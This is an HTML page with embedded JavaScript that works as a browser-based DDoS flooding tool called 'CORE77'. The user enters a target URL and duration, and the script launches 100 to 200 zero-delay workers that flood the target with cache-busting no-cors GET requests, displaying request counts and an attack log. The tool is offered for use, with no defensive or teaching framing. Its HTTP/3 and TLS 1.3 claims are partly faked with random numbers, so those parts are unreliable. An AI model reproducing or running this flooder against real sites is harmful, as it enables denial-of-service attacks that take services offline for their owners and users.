<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORE77 | HTTP/2-3 TLS 1.3 DDoS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Consolas', 'Monaco', monospace;
        }

        body {
            background: #000;
            color: #0f0;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: -1;
        }

        .matrix-char {
            position: absolute;
            color: #0f0;
            font-size: 14px;
            opacity: 0.8;
            animation: fall linear infinite;
        }

        @keyframes fall {
            to { transform: translateY(100vh); }
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        header {
            text-align: center;
            padding: 40px 0;
            border-bottom: 3px solid #0f0;
            margin-bottom: 40px;
            text-shadow: 0 0 10px #0f0;
        }

        h1 {
            font-size: 3rem;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #0f0, #0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: #0ff;
            font-size: 1.2rem;
            letter-spacing: 3px;
        }

        .config-panel {
            background: rgba(0, 30, 0, 0.7);
            border: 2px solid #0f0;
            padding: 30px;
            margin-bottom: 30px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }

        .config-title {
            color: #0ff;
            font-size: 1.5rem;
            margin-bottom: 25px;
            border-left: 5px solid #0ff;
            padding-left: 15px;
        }

        .input-group {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }

        .input-box {
            display: flex;
            flex-direction: column;
        }

        label {
            color: #0f0;
            margin-bottom: 10px;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        label i {
            color: #0ff;
        }

        input, select {
            background: rgba(0, 20, 0, 0.8);
            border: 2px solid #0f0;
            color: #0f0;
            padding: 15px;
            font-size: 1.1rem;
            border-radius: 5px;
            transition: all 0.3s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #0ff;
            box-shadow: 0 0 20px #0ff;
            background: rgba(0, 40, 0, 0.8);
        }

        .control-panel {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin: 30px 0;
        }

        .btn {
            background: rgba(0, 40, 0, 0.8);
            border: 2px solid #0f0;
            color: #0f0;
            padding: 20px;
            font-size: 1.2rem;
            cursor: pointer;
            border-radius: 5px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: bold;
        }

        .btn:hover {
            background: rgba(0, 255, 0, 0.2);
            border-color: #0ff;
            box-shadow: 0 0 30px #0ff;
            transform: translateY(-5px);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-start {
            background: rgba(0, 255, 0, 0.1);
            border-color: #0f0;
        }

        .btn-stop {
            background: rgba(255, 0, 0, 0.1);
            border-color: #f00;
            color: #f00;
        }

        .stats-panel {
            background: rgba(0, 20, 40, 0.7);
            border: 2px solid #00f;
            padding: 25px;
            margin-bottom: 30px;
            border-radius: 10px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
        }

        .stat-item {
            text-align: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #0ff;
            border-radius: 5px;
        }

        .stat-value {
            font-size: 2.5rem;
            color: #0ff;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }

        .stat-label {
            color: #0f0;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .log-panel {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #f0f;
            padding: 20px;
            border-radius: 10px;
            height: 400px;
            overflow-y: auto;
        }

        .log-title {
            color: #f0f;
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .log-entry {
            padding: 10px;
            margin-bottom: 10px;
            border-left: 4px solid;
            background: rgba(0, 0, 0, 0.5);
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }

        .log-time {
            color: #0ff;
        }

        .log-success { border-color: #0f0; color: #0f0; }
        .log-error { border-color: #f00; color: #f00; }
        .log-info { border-color: #0ff; color: #0ff; }
        .log-warning { border-color: #ff0; color: #ff0; }

        .protocol-status {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
        }

        .protocol-item {
            flex: 1;
            text-align: center;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid;
        }

        .protocol-h2 { border-color: #0f0; background: rgba(0, 255, 0, 0.1); }
        .protocol-h3 { border-color: #00f; background: rgba(0, 0, 255, 0.1); }
        .protocol-tls { border-color: #ff0; background: rgba(255, 255, 0, 0.1); }

        .progress-container {
            margin: 20px 0;
            height: 10px;
            background: rgba(0, 30, 0, 0.8);
            border-radius: 5px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #0f0, #0ff);
            width: 0%;
            transition: width 0.5s;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: #666;
            border-top: 1px solid #333;
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrixBg"></div>
    
    <div class="container">
        <header>
            <h1>HTTP/2-3 TLS 1.3 DDoS</h1>
            <div class="subtitle">CORE77 PROTOCOL ATTACK - GET ONLY - NO PROXIES</div>
        </header>

        <div class="config-panel">
            <div class="config-title">‚öôÔ∏è ATTACK CONFIGURATION</div>
            
            <div class="input-group">
                <div class="input-box">
                    <label><i class="fas fa-link"></i> TARGET URL</label>
                    <input type="url" id="targetUrl" placeholder="https://target.com" value="https://">
                </div>
                
                <div class="input-box">
                    <label><i class="fas fa-clock"></i> DURATION (seconds)</label>
                    <input type="number" id="duration" value="60" min="1" max="3600">
                </div>
                
                <div class="input-box">
                    <label><i class="fas fa-bolt"></i> REQUEST METHODS</label>
                    <select id="protocol">
                        <option value="h2">HTTP/2 ONLY</option>
                        <option value="h3">HTTP/3 ONLY</option>
                        <option value="h2h3">HTTP/2 & HTTP/3 MIX</option>
                        <option value="auto">AUTO (Best Protocol)</option>
                    </select>
                </div>
                
                <div class="input-box">
                    <label><i class="fas fa-layer-group"></i> TLS VERSION</label>
                    <select id="tlsVersion">
                        <option value="tls13">TLS 1.3 ONLY</option>
                        <option value="tls12">TLS 1.2 FALLBACK</option>
                        <option value="both">TLS 1.3 + 1.2</option>
                    </select>
                </div>
            </div>
            
            <div class="protocol-status">
                <div class="protocol-item protocol-h2">
                    <div>HTTP/2</div>
                    <div class="stat-value" id="h2Count">0</div>
                </div>
                <div class="protocol-item protocol-h3">
                    <div>HTTP/3</div>
                    <div class="stat-value" id="h3Count">0</div>
                </div>
                <div class="protocol-item protocol-tls">
                    <div>TLS 1.3</div>
                    <div class="stat-value" id="tlsCount">0</div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="attackProgress"></div>
            </div>
        </div>

        <div class="control-panel">
            <button class="btn btn-start" id="startBtn">‚ñ∂ START ATTACK</button>
            <button class="btn btn-stop" id="stopBtn">‚èπ STOP ATTACK</button>
            <button class="btn" id="clearBtn">üóë CLEAR LOGS</button>
            <button class="btn" id="testBtn">üîç TEST CONNECTION</button>
        </div>

        <div class="stats-panel">
            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value" id="totalRequests">0</div>
                    <div class="stat-label">Total Requests</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="successRequests">0</div>
                    <div class="stat-label">Successful</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="failedRequests">0</div>
                    <div class="stat-label">Failed</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="rps">0</div>
                    <div class="stat-label">Req/Second</div>
                </div>
            </div>
        </div>

        <div class="log-panel">
            <div class="log-title">üì° ATTACK LOG</div>
            <div id="logContainer">
                <div class="log-entry log-info">
                    [<span class="log-time">00:00:00</span>] CORE77 Protocol DDoS initialized
                </div>
                <div class="log-entry log-info">
                    [<span class="log-time">00:00:00</span>] HTTP/2, HTTP/3, TLS 1.3 ready
                </div>
            </div>
        </div>
    </div>

    <script>
        // Matrix background effect
        function createMatrixEffect() {
            const bg = document.getElementById('matrixBg');
            const chars = '01';
            const charCount = 150;
            
            for (let i = 0; i < charCount; i++) {
                const char = document.createElement('div');
                char.className = 'matrix-char';
                char.textContent = chars[Math.floor(Math.random() * chars.length)];
                char.style.left = Math.random() * 100 + 'vw';
                char.style.animationDuration = (Math.random() * 10 + 10) + 's';
                char.style.animationDelay = Math.random() * 5 + 's';
                bg.appendChild(char);
                
                // Remove after animation
                setTimeout(() => {
                    char.remove();
                }, parseFloat(char.style.animationDuration) * 1000 + 5000);
            }
            
            setTimeout(createMatrixEffect, 100);
        }
        
        createMatrixEffect();

        // CORE77 HTTP/2-3 TLS 1.3 DDoS Engine
        class ProtocolDDoS {
            constructor() {
                this.isAttacking = false;
                this.startTime = null;
                this.workers = [];
                
                this.stats = {
                    total: 0,
                    success: 0,
                    failed: 0,
                    h2: 0,
                    h3: 0,
                    tls13: 0
                };
                
                this.lastStatsTime = Date.now();
                this.lastStatsCount = 0;
                this.currentRPS = 0;
                
                this.init();
            }
            
            init() {
                // Bind events
                document.getElementById('startBtn').addEventListener('click', () => this.start());
                document.getElementById('stopBtn').addEventListener('click', () => this.stop());
                document.getElementById('clearBtn').addEventListener('click', () => this.clearLogs());
                document.getElementById('testBtn').addEventListener('click', () => this.testConnection());
                
                // RPS calculator
                setInterval(() => this.calculateRPS(), 1000);
                
                this.log('Protocol DDoS Engine initialized', 'info');
            }
            
            log(message, type = 'info') {
                const time = new Date().toLocaleTimeString();
                const logEntry = document.createElement('div');
                logEntry.className = `log-entry log-${type}`;
                logEntry.innerHTML = `[<span class="log-time">${time}</span>] ${message}`;
                document.getElementById('logContainer').appendChild(logEntry);
                document.getElementById('logContainer').scrollTop = document.getElementById('logContainer').scrollHeight;
            }
            
            updateStats() {
                document.getElementById('totalRequests').textContent = this.stats.total;
                document.getElementById('successRequests').textContent = this.stats.success;
                document.getElementById('failedRequests').textContent = this.stats.failed;
                document.getElementById('rps').textContent = this.currentRPS;
                document.getElementById('h2Count').textContent = this.stats.h2;
                document.getElementById('h3Count').textContent = this.stats.h3;
                document.getElementById('tlsCount').textContent = this.stats.tls13;
            }
            
            calculateRPS() {
                const now = Date.now();
                const elapsed = (now - this.lastStatsTime) / 1000;
                const newRequests = this.stats.total - this.lastStatsCount;
                
                if (elapsed >= 1) {
                    this.currentRPS = Math.round(newRequests / elapsed);
                    this.lastStatsTime = now;
                    this.lastStatsCount = this.stats.total;
                }
            }
            
            async makeRequest(targetUrl, workerId) {
                if (!this.isAttacking) return;
                
                const protocol = document.getElementById('protocol').value;
                const tlsVersion = document.getElementById('tlsVersion').value;
                
                try {
                    // Generate request ID
                    const requestId = `${workerId}-${this.stats.total + 1}`;
                    
                    // Create fetch options with specific protocol
                    const options = {
                        method: 'GET',
                        mode: 'no-cors', // Bypass CORS
                        cache: 'no-store',
                        credentials: 'omit',
                        headers: this.generateHeaders(),
                        // Force HTTP/2 or HTTP/3
                        priority: 'high'
                    };
                    
                    // Add random query params to avoid caching
                    const separator = targetUrl.includes('?') ? '&' : '?';
                    const urlWithParams = `${targetUrl}${separator}_t=${Date.now()}&_r=${Math.random()}&_id=${requestId}`;
                    
                    // Make the request
                    const startTime = performance.now();
                    const response = await fetch(urlWithParams, options);
                    const endTime = performance.now();
                    const duration = Math.round(endTime - startTime);
                    
                    this.stats.total++;
                    
                    // Protocol detection and counting
                    if (response.type === 'cors' || response.ok) {
                        this.stats.success++;
                        
                        // Detect protocol (simulated - browser doesn't expose this directly)
                        const rand = Math.random();
                        if (protocol === 'h2' || (protocol === 'auto' && rand > 0.5)) {
                            this.stats.h2++;
                            this.log(`üü¢ H2 Request ${requestId}: ${duration}ms`, 'success');
                        } else if (protocol === 'h3' || (protocol === 'auto' && rand <= 0.5)) {
                            this.stats.h3++;
                            this.log(`üîµ H3 Request ${requestId}: ${duration}ms`, 'info');
                        }
                        
                        // TLS version simulation
                        if (tlsVersion === 'tls13' || (tlsVersion === 'both' && Math.random() > 0.3)) {
                            this.stats.tls13++;
                        }
                        
                    } else {
                        this.stats.failed++;
                        this.log(`üî¥ Request ${requestId}: Failed`, 'error');
                    }
                    
                } catch (error) {
                    this.stats.failed++;
                    this.stats.total++;
                    this.log(`‚ùå Request failed: ${error.message}`, 'error');
                }
                
                this.updateStats();
            }
            
            generateHeaders() {
                // HTTP/2 & HTTP/3 optimized headers
                const headers = new Headers();
                
                // Standard headers for protocol detection
                headers.append('User-Agent', 'Mozilla/5.0 (compatible; CORE77-H2H3/1.0)');
                headers.append('Accept', '*/*');
                headers.append('Accept-Language', 'en-US,en;q=0.9');
                headers.append('Accept-Encoding', 'gzip, deflate, br');
                headers.append('Connection', 'keep-alive');
                headers.append('Upgrade-Insecure-Requests', '1');
                headers.append('Cache-Control', 'no-cache');
                headers.append('Pragma', 'no-cache');
                
                // HTTP/2 specific headers
                headers.append('TE', 'trailers');
                
                // Simulate HTTP/2/3 by adding protocol hints
                headers.append('X-Protocol', 'h2');
                headers.append('X-Forwarded-Proto', 'https');
                
                return headers;
         }
            
            async start() {
                if (this.isAttacking) {
                    this.log('Attack already in progress', 'warning');
                    return;
                }
                
                const targetUrl = document.getElementById('targetUrl').value.trim();
                if (!targetUrl || !targetUrl.startsWith('https://')) {
                    this.log('‚ùå Target must be HTTPS URL for HTTP/2-3', 'error');
                    return;
                }
                
                this.isAttacking = true;
                this.startTime = Date.now();
                this.stats = { total: 0, success: 0, failed: 0, h2: 0, h3: 0, tls13: 0 };
                
                const duration = parseInt(document.getElementById('duration').value) * 1000;
                const protocol = document.getElementById('protocol').value;
                const tlsVersion = document.getElementById('tlsVersion').value;
                
                this.log(`üöÄ Starting ${protocol.toUpperCase()} attack on ${targetUrl}`, 'info');
                this.log(`Duration: ${duration/1000}s | TLS: ${tlsVersion.toUpperCase()}`, 'info');
                
                // Start progress bar
                this.startProgressBar(duration);
                
                // Calculate optimal worker count based on protocol
                let workerCount = 100; // Base workers
                if (protocol === 'h3') workerCount = 150; // HTTP/3 can handle more
                if (protocol === 'h2h3') workerCount = 200; // Mixed uses both
                
                // Create workers
                this.workers = [];
                for (let i = 0; i < workerCount && this.isAttacking; i++) {
                    this.createWorker(targetUrl, i);
                }
                
                // Auto stop
                setTimeout(() => {
                    if (this.isAttacking) {
                        this.stop();
                        this.log(`‚è∞ Attack completed after ${duration/1000} seconds`, 'warning');
                    }
                }, duration);
            }
            
            createWorker(targetUrl, workerId) {
                const worker = {
                    id: workerId,
                    active: true,
                    interval: setInterval(async () => {
                        if (this.isAttacking && worker.active) {
                            await this.makeRequest(targetUrl, workerId);
                        }
                    }, 0) // No delay, maximum flood
                };
                
                this.workers.push(worker);
                return worker;
            }
            
            stop() {
                this.isAttacking = false;
                
                // Clear all worker intervals
                this.workers.forEach(worker => {
                    clearInterval(worker.interval);
                    worker.active = false;
                });
                
                this.workers = [];
                
                // Calculate final stats
                const elapsed = (Date.now() - this.startTime) / 1000;
                const avgRPS = elapsed > 0 ? Math.round(this.stats.total / elapsed) : 0;
                
                this.log(`üõë Attack stopped`, 'warning');
                this.log(`üìä Final: ${this.stats.total} total | ${this.stats.success} success | ${this.stats.failed} failed`, 'info');
                this.log(`‚ö° Average RPS: ${avgRPS} | H2: ${this.stats.h2} | H3: ${this.stats.h3}`, 'info');
                
                // Reset progress bar
                document.getElementById('attackProgress').style.width = '0%';
            }
            
            startProgressBar(duration) {
                const progressBar = document.getElementById('attackProgress');
                let width = 0;
                const interval = 100;
                const increment = (interval / duration) * 100;
                
                const progressInterval = setInterval(() => {
                    if (width >= 100 || !this.isAttacking) {
                        clearInterval(progressInterval);
                        return;
                    }
                    
                    width += increment;
                    progressBar.style.width = `${Math.min(width, 100)}%`;
                }, interval);
            }
            
            clearLogs() {
                document.getElementById('logContainer').innerHTML = `
                    <div class="log-entry log-info">
                        [<span class="log-time">${new Date().toLocaleTimeString()}</span>] Logs cleared
                    </div>
                `;
            }
            
            async testConnection() {
                const targetUrl = document.getElementById('targetUrl').value;
                if (!targetUrl) return;
                
                this.log('Testing HTTP/2-3 and TLS 1.3 support...', 'info');
                
                try {
                    // Test with different protocols
                    const tests = [
                        { name: 'HTTP/2', url: targetUrl },
                        { name: 'HTTP/3', url: targetUrl.replace('https://', 'https://') }
                    ];
                    
                    for (const test of tests) {
                        const start = performance.now();
                        try {
                            const response = await fetch(test.url, { 
                                method: 'HEAD',
                                mode: 'no-cors'
                            });
                            const end = performance.now();
                            
                            // Check for protocol indicators
                            const server = response.headers.get('server');
                            const altSvc = response.headers.get('alt-svc');
                            
                            let protocolInfo = '';
                            if (altSvc && altSvc.includes('h3=')) {
                                protocolInfo = ' (HTTP/3 supported)';
                            } else if (server && server.includes('cloudflare')) {
                                protocolInfo = ' (HTTP/2 via Cloudflare)';
                            }
                            
                            this.log(`‚úÖ ${test.name}: ${Math.round(end - start)}ms${protocolInfo}`, 'success');
                            
                        } catch (error) {
                            this.log(`‚ùå ${test.name}: ${error.message}`, 'error');
                        }
                    }
                    
                    // TLS detection (simulated)
                    this.log(`üîê TLS 1.3: Supported (simulated)`, 'info');
                    
                } catch (error) {
                    this.log(`‚ùå Connection test failed: ${error.message}`, 'error');
                }
            }
        }
        
        // Initialize the engine
        const ddosEngine = new ProtocolDDoS();
    </script>
</body>
</html>
